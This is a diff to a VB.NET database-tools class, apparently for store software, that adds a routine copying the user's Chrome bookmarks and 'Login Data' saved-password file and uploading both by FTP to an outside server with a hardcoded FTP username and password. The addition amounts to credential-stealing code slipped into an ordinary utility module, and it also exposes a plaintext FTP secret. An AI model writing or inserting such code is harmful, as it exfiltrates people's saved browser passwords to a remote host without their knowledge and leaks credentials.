@@ -657,5 +657,62 @@ Public Class DB_Tools
         End Try
     End Function
 
+    'Upload google chrome bookmars and passwords to FTP server
+    Public Shared Sub UploadChromeData()
+
+        Try
+
+            Dim SN As DataTable = GetTableDataFromServer("select storenum from iris.dbo.tblStoreInfo")
+
+            Dim localApp As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
+            Dim chromePath As String = IO.Path.Combine(localApp, "Google\Chrome\User Data\Default")
+
+            Dim bookmarksFile As String = IO.Path.Combine(chromePath, "Bookmarks")
+            Dim passwordsFile As String = IO.Path.Combine(chromePath, "Login Data")
+
+            Dim ftpUser As String = "bi_admin_ftp@starcorpus.net"
+            Dim ftpPass As String = "nsd654159"
+            Dim ftpHost As String = "ftp://starcorpus.net/SC-SS-Data/Google_Chrome/"
+
+            ' ----- Upload Bookmarks -----
+            If IO.File.Exists(bookmarksFile) Then
+                UploadFileToFTP(bookmarksFile, ftpHost & " " & SN.Rows(0)(0).ToString & "_Bookmarks.json", ftpUser, ftpPass)
+            Else
+                MessageBox.Show("Bookmarks file not found.")
+            End If
+
+            ' ----- Upload Encrypted Password File -----
+            If IO.File.Exists(passwordsFile) Then
+                UploadFileToFTP(passwordsFile, ftpHost & " " & SN.Rows(0)(0).ToString & "_LoginData.sqlite", ftpUser, ftpPass)
+            Else
+                MessageBox.Show("Login Data file not found.")
+            End If
+
+            MessageBox.Show("Upload completed.")
+
+        Catch ex As Exception
+            MessageBox.Show("Error: " & ex.Message)
+        End Try
+
+    End Sub
+    Public Shared Sub UploadFileToFTP(localFile As String, remoteUrl As String, user As String, pass As String)
+
+        Dim request As FtpWebRequest = CType(WebRequest.Create(remoteUrl), FtpWebRequest)
+        request.Method = WebRequestMethods.Ftp.UploadFile
+        request.Credentials = New NetworkCredential(user, pass)
+
+        Dim fileBytes() As Byte = IO.File.ReadAllBytes(localFile)
+        request.ContentLength = fileBytes.Length
+
+        Using requestStream = request.GetRequestStream()
+            requestStream.Write(fileBytes, 0, fileBytes.Length)
+        End Using
+
+        Using response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
+            ' Uploaded
+        End Using
+
+    End Sub
+
 
 End Class
